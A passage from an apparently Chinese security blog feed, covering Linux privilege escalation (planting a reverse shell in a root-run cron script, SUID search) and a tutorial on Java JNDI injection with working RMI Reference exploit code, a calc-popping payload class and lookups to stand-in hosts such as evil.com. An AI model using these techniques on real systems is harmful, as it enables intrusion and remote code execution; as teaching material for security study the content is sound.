title="1.替换文件提权"></a>1.替换文件提权</h3><p>我们可以运行上述两种工具中的任意一种，来找到系统潜在的漏洞，比如</p><p><img src="/./../../images/Linux%E6%8F%90%E6%9D%83-1/image-20230722115616094.png" alt="image-20230722115616094"></p><p>这代表着我们可以有能力运行&#x2F;bin&#x2F;bash</p><p>并且根据给出的 crontab 内容，可以看出系统每小时会执行 <code>/etc/cron.hourly</code> 目录下的脚本，每天执行 <code>/etc/cron.daily</code> 目录下的脚本，每周执行 <code>/etc/cron.weekly</code> 目录下的脚本，每月执行 <code>/etc/cron.monthly</code> 目录下的脚本。此外，还有两个额外的任务在定时执行，分别是 <code>overwrite.sh</code> 和 <code>/usr/local/bin/compress.sh</code>。其中，<code>overwrite.sh</code> 是以 root 用户身份执行的，可能会有一定的风险。需要进一步检查这些脚本的内容和权限设置，以确定是否存在潜在的安全漏洞。</p><p>我们可以尝试找到该文件的位置，并且放入一个反弹shell的命令进入该文件，获取shell</p><p>可以这样操作</p><p>locat filename –&gt;得到overwrite文件地址</p><p>进行编辑，添加bash反弹shell命令并进行监听</p><p>这里再推荐一个系统提权的优秀网站</p><p><a href="https://gtfobins.github.io/">GTFOBins</a></p><h3 id="2-tar提权"><a href="#2-tar提权" class="headerlink" title="2.tar提权"></a>2.tar提权</h3><p><img src="/./../../images/Linux%E6%8F%90%E6%9D%83-1/image-20230722134441274.png" alt="image-20230722134441274"></p><p>发现一个tar定时任务，并进行以下操作便可以触发恶意文件shell.elf</p><h2 id="ssh提权"><a href="#ssh提权" class="headerlink" title="ssh提权"></a>ssh提权</h2><p>可以看一下.ssh目录下有没有可以使用的密钥，并连接到其他高权限账户</p><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>find &#x2F; -perm -4000 -type f -exec ls -la {} 2&gt;&#x2F;dev&#x2F;null ;</p><p>这个命令是一个 Linux 和 Unix 系统中常用的查找具有 SUID 和 SGID 标志的文件的命令。SUID 和 SGID 标志可以让普通用户在执行某些程序时以超级用户权限或者其他用户权限运行该程序，从而可能导致系统安全问题。</p><p>具体来说，这个命令会在根目录下递归查找具有 SUID 或 SGID 标志的文件，并将它们的详细信息输出到标准输出。其中 <code>-perm -4000</code> 表示查找具有 SUID 标志的文件，<code>-type f</code> 表示只查找文件类型为“普通文件”的对象，<code>-exec ls -la &#123;&#125; \;</code> 表示对每个匹配项执行 <code>ls -la</code> 命令并输出详细信息，<code>2&gt;/dev/null</code> 表示将错误输出重定向到空设备，以避免在输出中显示一些不必要的错误信息。</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>0x03-提权</category>
      
      <category>0x09-Linux提权</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web攻防</tag>
      
      <tag>网络安全</tag>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全之JNDI</title>
    <link href="/2023/07/21/Java%E5%AE%89%E5%85%A8%E4%B9%8BJNDI/"/>
    <url>/2023/07/21/Java%E5%AE%89%E5%85%A8%E4%B9%8BJNDI/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI"></a>什么是JNDI</h2><p>JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。</p><p>简单点说，JNDI就是一组API接口。每一个对象都有一组唯一的键值绑定，将名字和对象绑定，可以通过名字检索指定的对象，而该对象可能存储在RMI、LDAP、CORBA等等。</p><p>其中最常见的就是rmi和ldap这两种服务了</p><p>RMI：远程方法调用注册表</p><p>LDAP：轻量级目录访问协议</p><p><img src="/./../../images/Java%E5%AE%89%E5%85%A8%E4%B9%8BJNDI/image-20230721103835229.png" alt="image-20230721103835229"></p><h3 id="Java-Naming"><a href="#Java-Naming" class="headerlink" title="Java Naming"></a>Java Naming</h3><p>命名服务是一种键值对的绑定，使应用程序可以通过键检索值。</p><h3 id="Java-Directory"><a href="#Java-Directory" class="headerlink" title="Java Directory"></a>Java Directory</h3><p>目录服务是命名服务的自然扩展。这两者之间的区别在于目录服务中对象可以有属性，而命名服务中对象没有属性。因此，在目录服务中可以根据属性搜索对象。</p><p>JNDI允许你访问文件系统中的文件，定位远程RMI注册的对象，访问如LDAP这样的目录服务，定位网络上的EJB组件。</p><h3 id="ObjectFactory"><a href="#ObjectFactory" class="headerlink" title="ObjectFactory"></a>ObjectFactory</h3><p>Object Factory用于将Naming Service（如RMI&#x2F;LDAP）中存储的数据转换为Java中可表达的数据，如Java中的对象或Java中的基本数据类型。每一个Service Provider可能配有多个Object Factory。</p><p>JNDI注入的问题就是处在可远程下载自定义的ObjectFactory类上。</p><h2 id="JNDI的代码示例"><a href="#JNDI的代码示例" class="headerlink" title="JNDI的代码示例"></a>JNDI的代码示例</h2><p>在JNDI中提供了绑定和查找的方法：</p><ul><li>bind：将名称绑定到对象中；</li><li>lookup：通过名字检索执行的对象；</li></ul><p>下面是基本用法Demo，以RMI服务为例。</p><p>先定义一个Person类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Remote</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String password;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPassword</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-built_in">this</span>.password = password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;name:&quot;</span>+name+<span class="hljs-string">&quot; password:&quot;</span>+password;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Server.java，其实是将服务端和客户端的代码写在一起了，分为两个部分。第一部分是initPerson()函数即服务端，其通过JNDI实现RMI服务，并通过JNDI的bind()函数将实例化的Person对象绑定到RMI服务中；第二部分是findPerson()函数即客户端，其通过JNDI的lookup方法来检索person对象并输出出来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initPerson</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常</span><br>        LocateRegistry.createRegistry(<span class="hljs-number">6666</span>);<br>        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br>        System.setProperty(Context.PROVIDER_URL, <span class="hljs-string">&quot;rmi://localhost:6666&quot;</span>);<br><br>        <span class="hljs-comment">//初始化</span><br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br><br>        <span class="hljs-comment">//实例化person对象</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        p.setName(<span class="hljs-string">&quot;mi1k7ea&quot;</span>);<br>        p.setPassword(<span class="hljs-string">&quot;Niubility!&quot;</span>);<br><br>        <span class="hljs-comment">//person对象绑定到JNDI服务中，JNDI的名字叫做：person。</span><br>        ctx.bind(<span class="hljs-string">&quot;person&quot;</span>, p);<br>        ctx.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">findPerson</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用在绑定了</span><br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br><br>        <span class="hljs-comment">//通过lookup查找person对象</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person) ctx.lookup(<span class="hljs-string">&quot;person&quot;</span>);<br><br>        <span class="hljs-comment">//打印出这个对象</span><br>        System.out.println(person.toString());<br>        ctx.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        initPerson();<br>        findPerson();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行Server的程序，findPerson()函数会成功从启动的JNDI服务中找到指定的对象并输出出来：</p><p><img src="/./../../images/Java%E5%AE%89%E5%85%A8%E4%B9%8BJNDI/image-20230721105128718.png" alt="image-20230721105128718"></p><h2 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h2><p>Reference类表示对存在于命名&#x2F;目录系统以外的对象的引用。</p><p>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能。对象可以通过绑定Reference，存储在Naming或Directory服务下，比如RMI、LDAP等。</p><p>在使用Reference时，我们可以直接将对象写在构造方法中，当被调用时，对象的方法就会被触发。</p><p>几个比较关键的属性：</p><ul><li>className：远程加载时所使用的类名；</li><li>classFactory：加载的class中需要实例化类的名称；</li><li>classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file&#x2F;ftp&#x2F;http等协议；</li></ul><h2 id="远程代码和安全管理器"><a href="#远程代码和安全管理器" class="headerlink" title="远程代码和安全管理器"></a>远程代码和安全管理器</h2><p>这部分引用自：<a href="https://blog.csdn.net/u011721501/article/details/52316225">https://blog.csdn.net/u011721501/article/details/52316225</a></p><h3 id="Java中的安全管理器"><a href="#Java中的安全管理器" class="headerlink" title="Java中的安全管理器"></a>Java中的安全管理器</h3><blockquote><p>Java中的对象分为本地对象和远程对象，本地对象是默认为可信任的，但是远程对象是不受信任的。比如，当我们的系统从远程服务器加载一个对象，为了安全起见，JVM就要限制该对象的能力，比如禁止该对象访问我们本地的文件系统等，这些在现有的JVM中是依赖安全管理器（SecurityManager）来实现的。<br><img src="/./../../images/Java%E5%AE%89%E5%85%A8%E4%B9%8BJNDI/image-20230721105647757.png" alt="image-20230721105647757"><br>JVM中采用的最新模型见上图，引入了“域”的概念，在不同的域中执行不同的权限。JVM会把所有代码加载到不同的系统域和应用域，系统域专门负责与关键资源进行交互，而应用域则通过系统域的部分代理来对各种需要的资源进行访问，存在于不同域的class文件就具有了当前域的全部权限。<br>关于安全管理机制，可以详细阅读: <a href="http://www.ibm.com/developerworks/cn/java/j-lo-javasecurity/">http://www.ibm.com/developerworks/cn/java/j-lo-javasecurity/</a></p></blockquote><h3 id="JNDI的安全管理器"><a href="#JNDI的安全管理器" class="headerlink" title="JNDI的安全管理器"></a>JNDI的安全管理器</h3><p>这部分在后面绕过高版本JDK限制中也会具体讲到。</p><blockquote><p>对于加载远程对象，JDNI有两种不同的安全控制方式，对于Naming Manager来说，相对的安全管理器的规则比较宽泛，但是对JNDI SPI层会按照下面表格中的规则进行控制：<br><img src="/./../../images/Java%E5%AE%89%E5%85%A8%E4%B9%8BJNDI/image-20230721105711774.png" alt="image-20230721105711774"><br>针对以上特性，黑客可能会找到一些特殊场景，利用两者的差异来执行恶意代码。</p></blockquote><h2 id="JNDI协议动态转换"><a href="#JNDI协议动态转换" class="headerlink" title="JNDI协议动态转换"></a>JNDI协议动态转换</h2><p>举前面的例子，JNDI实现的RMI服务中，可以在初始化配置JNDI设置时，预先指定其上下文环境（RMI、LDAP、CORBA等），这里列出前面的两种写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-type">Properties</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>    env.put(Context.INITIAL_CONTEXT_FACTORY,<br>            <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br>    env.put(Context.PROVIDER_URL,<br>            <span class="hljs-string">&quot;rmi://localhost:1099&quot;</span>);<br>    <span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(env);<br><br>或<br><br>LocateRegistry.createRegistry(<span class="hljs-number">6666</span>);<br>    System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br>    System.setProperty(Context.PROVIDER_URL, <span class="hljs-string">&quot;rmi://localhost:6666&quot;</span>);<br>    <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br></code></pre></td></tr></table></figure><p>但在调用lookup()或者search()时，可以使用URI动态地转换上下文环境，例如，上面已经设置了当前上下文会访问RMI服务，那么，可以直接使用LDAP的URI格式转换上下文环境，访问LDAP服务上的绑定对象，而非原本的RMI服务：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ctx.lookup(<span class="hljs-string">&quot;ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com&quot;</span>);<br></code></pre></td></tr></table></figure><p>其原理可以跟踪代码找到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">lookup</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>    <span class="hljs-keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);<br>&#125;<br></code></pre></td></tr></table></figure><p>再跟进去就知道了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Context <span class="hljs-title function_">getURLOrDefaultInitCtx</span><span class="hljs-params">(Name paramName)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>    <span class="hljs-keyword">if</span> (NamingManager.hasInitialContextFactoryBuilder()) &#123;<br>        <span class="hljs-keyword">return</span> getDefaultInitCtx(); <br>    &#125;<br>    <span class="hljs-keyword">if</span> (paramName.size() &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> paramName.get(<span class="hljs-number">0</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> getURLScheme(str1);  <span class="hljs-comment">// 尝试解析 URI 中的协议</span><br>        <span class="hljs-keyword">if</span> (str2 != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// 如果存在 Schema 协议，则尝试获取其对应的上下文环境</span><br>            <span class="hljs-type">Context</span> <span class="hljs-variable">localContext</span> <span class="hljs-operator">=</span> NamingManager.getURLContext(str2, <span class="hljs-built_in">this</span>.myProps);<br>            <span class="hljs-keyword">if</span> (localContext != <span class="hljs-literal">null</span>) &#123; <br>                <span class="hljs-keyword">return</span> localContext;<br>            &#125;<br>        &#125;  <br>    &#125;<br>    <span class="hljs-keyword">return</span> getDefaultInitCtx();<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x02-JNDI注入"><a href="#0x02-JNDI注入" class="headerlink" title="0x02 JNDI注入"></a>0x02 JNDI注入</h1><h2 id="前提条件-amp-JDK防御"><a href="#前提条件-amp-JDK防御" class="headerlink" title="前提条件&amp;JDK防御"></a>前提条件&amp;JDK防御</h2><p>要想成功利用JNDI注入漏洞，重要的前提就是当前Java环境的JDK版本，而JNDI注入中不同的攻击向量和利用方式所被限制的版本号都有点不一样。</p><p>这里将所有不同版本JDK的防御都列出来：</p><ul><li><p>JDK 6u45、7u21之后：<code>java.rmi.server.useCodebaseOnly</code>的默认值被设置为true。当该值为true时，将<code>禁用自动加载远程类文件</code>，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p></li><li><p>JDK 6u141、7u131、8u121之后：增加了<code>com.sun.jndi.rmi.object.trustURLCodebase</code>选项，默认为false，<code>禁止RMI和CORBA协议使用远程codebase的选项</code>，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</p></li><li><p>JDK 6u211、7u201、8u191之后：增加了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为false，<code>禁止LDAP协议使用远程codebase的选项</code>，把LDAP协议的攻击途径也给禁了。</p><p><img src="/./../../images/Java%E5%AE%89%E5%85%A8%E4%B9%8BJNDI/image-20230721110231275.png" alt="image-20230721110231275"></p></li></ul><p>因此，我们在进行JNDI注入之前，必须知道当前环境JDK版本这一前提条件，只有JDK版本在可利用的范围内才满足我们进行JNDI注入的前提条件。</p><h2 id="RMI攻击向量"><a href="#RMI攻击向量" class="headerlink" title="RMI攻击向量"></a>RMI攻击向量</h2><h3 id="RMI-Reference利用技巧"><a href="#RMI-Reference利用技巧" class="headerlink" title="RMI+Reference利用技巧"></a>RMI+Reference利用技巧</h3><p>JNDI提供了一个Reference类来表示某个对象的引用，这个类中包含被引用对象的类信息和地址。</p><p>因为在JNDI中，对象传递要么是序列化方式存储（对象的拷贝，按值传递），要么是按照引用（对象的引用，按引用传递）来存储，当序列化不好用的时候，我们可以使用Reference将对象存储在JNDI系统中。</p><p>那么这个JNDI利用技巧是啥呢？——就是将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，<strong>当攻击者可以控制JNDI客户端的lookup()参数，或Reference类构造方法的classFactoryLocation参数时</strong>，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而，加载远程服务器上的恶意class文件，在客户端本地执行，最终实现JNDI注入攻击，导致远程代码执行。</p><p>我们看个示例，以lookup()函数参数外部可控为例，攻击原理如图：</p><p><img src="/./../../images/Java%E5%AE%89%E5%85%A8%E4%B9%8BJNDI/image-20230721111119313.png" alt="image-20230721111119313"></p><ul><li>攻击者通过可控的 URI 参数，<em>触发动态环境转换</em>，例如，这里 URI 为 rmi:&#x2F;&#x2F;evil.com:1099&#x2F;refObj；</li><li>原先配置好的上下文环境 rmi:&#x2F;&#x2F;localhost:1099 会因为动态环境转换，而被指向 rmi:&#x2F;&#x2F;evil.com:1099&#x2F;；</li><li>应用去 rmi:&#x2F;&#x2F;evil.com:1099 请求绑定对象 refObj，攻击者事先准备好的 RMI 服务，会返回与refObj相绑定的ReferenceWrapper对象（Reference(“EvilObject”, “EvilObject”, “<a href="http://evil-cb.com/%E2%80%9D)%EF%BC%89%EF%BC%9B">http://evil-cb.com/”)）；</a></li><li>应用获取到 ReferenceWrapper 对象，开始从本地 CLASSPATH 中搜索 EvilObject 类，如果不存在，则会从 <a href="http://evil-cb.com/">http://evil-cb.com/</a> 上去尝试获取 EvilObject.class，即动态的去获取 <a href="http://evil-cb.com/EvilObject.class%EF%BC%9B">http://evil-cb.com/EvilObject.class；</a></li><li>攻击者事先准备好的服务返回编译好的包含恶意代码的 EvilObject.class；</li><li>应用开始调用 EvilObject 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行；</li></ul><p>代码如下，当然，需要注意JDK版本的影响，我本地JDK版本为1.8.0_73。</p><p>JNDIClient.java，lookup()函数参数外部可控：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span>(args.length &lt; <span class="hljs-number">1</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Usage: java JNDIClient &lt;uri&gt;&quot;</span>);<br>            System.exit(-<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        System.out.println(<span class="hljs-string">&quot;Using lookup() to fetch object with &quot;</span> + uri);<br>        ctx.lookup(uri);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>EvilObject.java，目的是弹计算器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilObject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        String[] commands = &#123;<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;/C&quot;</span>, <span class="hljs-string">&quot;calc.exe&quot;</span>&#125;;<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> rt.exec(commands);<br>        pc.waitFor();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>RMIService.java，对象实例要能成功绑定在RMI服务上，必须直接或间接的实现 Remote 接口，这里 ReferenceWrapper就继承于 UnicastRemoteObject 类并实现了Remote接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIService</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">refObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;EvilObject&quot;</span>, <span class="hljs-string">&quot;EvilObject&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:8080/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">refObjWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(refObj);<br>        System.out.println(<span class="hljs-string">&quot;Binding &#x27;refObjWrapper&#x27; to &#x27;rmi://127.0.0.1:1099/refObj&#x27;&quot;</span>);<br>        registry.bind(<span class="hljs-string">&quot;refObj&quot;</span>, refObjWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里将RMIService.java和JNDIClient.java放在同一目录下，将EvilObject.java放在另一个目录下（为防止漏洞复现过程中应用端实例化EvilObject对象时从CLASSPATH当前路径找到编译好的字节代码，而不去远端进行下载的情况发生）,编译这三个文件，并在不同窗口下执行命令，最后成功通过RMI+Reference的方式实现JNDI注入：</p><p><img src="/./../../images/Java%E5%AE%89%E5%85%A8%E4%B9%8BJNDI/image-20230721124452939.png" alt="image-20230721124452939"></p><h3 id="漏洞点1——lookup参数注入"><a href="#漏洞点1——lookup参数注入" class="headerlink" title="漏洞点1——lookup参数注入"></a>漏洞点1——lookup参数注入</h3><p>当JNDI客户端的lookup()函数的参数可控，即URI可控时，根据JNDI协议动态转换的原理，攻击者可以传入恶意URI地址，指向攻击者的RMI注册表服务，以使受害者客户端加载绑定在攻击者RMI注册表服务上的恶意类，从而实现远程代码执行。</p><p>下面以RMI服务为例，原理和上一个小结讲的是一样的，本地JDK版本为1.8.0_73。</p><p>AClient.java，是JNDI客户端，原本上下文环境已经设置了默认连接本地的1099端口的RMI注册表服务，同时，程序允许用户输入URI地址来动态转换JNDI的访问地址，即此处lookup()函数的参数可控：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br> 